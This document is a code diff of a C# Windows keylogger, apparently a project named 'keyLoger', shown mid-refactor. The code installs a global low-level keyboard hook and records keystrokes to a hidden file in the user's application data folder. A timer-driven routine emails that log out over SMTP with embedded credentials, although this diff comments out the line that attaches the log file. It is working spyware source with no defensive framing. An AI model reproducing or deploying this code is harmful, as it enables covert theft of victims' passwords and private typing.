@@ -12,7 +12,7 @@ using Timer = System.Threading.Timer;
 
 namespace keyLoger
 {
-    public struct keyboardHookStruct
+    public struct KeyboardHookStruct
     {
         public int vkCode;
         public int scanCode;
@@ -23,28 +23,30 @@ namespace keyLoger
 
     public static class KeyLoger
     {
+        #region Constants
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+
+        private const byte VK_RETURN = 0X0D; //Enter
+        private const byte VK_SHIFT = 0x10; //shift
+        private const byte VK_CAPITAL = 0x14; //capslock
+        #endregion
+
         private static Timer _timer = new Timer(Callback, false /*object state*/, 0/*due time*/, 60000/*period 1 hour*/);
+
+        private static readonly string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "logs.dat");
+
+
+        private static readonly KeyboardHookProc _keyboardHookProc = HookCallback;
+
+        private static IntPtr _hookID = IntPtr.Zero;
 
         private static void Callback(object state)
         {
             var tread = new Thread(SendMail);
             //tread.Start();
         }
-
-        private static readonly string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"logs.dat") ;
-        #region Constants
-        private const int WH_KEYBOARD_LL = 13;
-        private const int WM_KEYDOWN = 0x0100;
        
-        private const byte VK_RETURN = 0X0D; //Enter
-        private const byte VK_SHIFT = 0x10; //shift
-        private const byte VK_CAPITAL = 0x14; //capslock
-        #endregion
-
-        private static readonly KeyboardHookProc _keyboardHookProc = HookCallback;
-
-        private static IntPtr _hookID = IntPtr.Zero;
-        
         public static void IntializeLL_KEYBOARDHook()
         {
             _hookID = SetHook(_keyboardHookProc);
@@ -52,7 +54,7 @@ namespace keyLoger
             User32.UnhookWindowsHookEx(_hookID);   
         }
 
-        public delegate int KeyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
+        public delegate int KeyboardHookProc(int code, int wParam, ref KeyboardHookStruct lParam);
         private static IntPtr SetHook(KeyboardHookProc proc)
         {
             using (var curProcess = Process.GetCurrentProcess())
@@ -63,7 +65,7 @@ namespace keyLoger
             }
         }
 
-      private static int HookCallback(int code, int wParam, ref keyboardHookStruct lParam)
+      private static int HookCallback(int code, int wParam, ref KeyboardHookStruct lParam)
         {
             var isDownShift = ((User32.GetKeyState(VK_SHIFT) & 0x80) == 0x80);
             var isDownCapslock = (User32.GetKeyState(VK_CAPITAL) != 0);
@@ -102,14 +104,9 @@ namespace keyLoger
               Body = DateTime.Now.ToString(),
               IsBodyHtml = true
           };
-          try
-          {
-              msg.Attachments.Add(new Attachment(path));
-          }
-          catch (UnauthorizedAccessException e)
-          {
-              msg.Attachments.Add(new Attachment(path));
-          }
+
+         // msg.Attachments.Add(new Attachment(path));
+         
           smtpClient.EnableSsl = true;
           smtpClient.Credentials = new NetworkCredential(email, password);
           smtpClient.Send(msg);
@@ -148,7 +145,7 @@ namespace keyLoger
         public static extern short GetKeyState(int vKey);
 
         [DllImport("user32.dll")]
-        public static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);
+        public static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref KeyboardHookStruct lParam);
 
         [DllImport("user32.dll")]
         public static extern IntPtr SetWindowsHookEx(int idHook, KeyLoger.KeyboardHookProc callback, IntPtr hInstance, uint threadId);
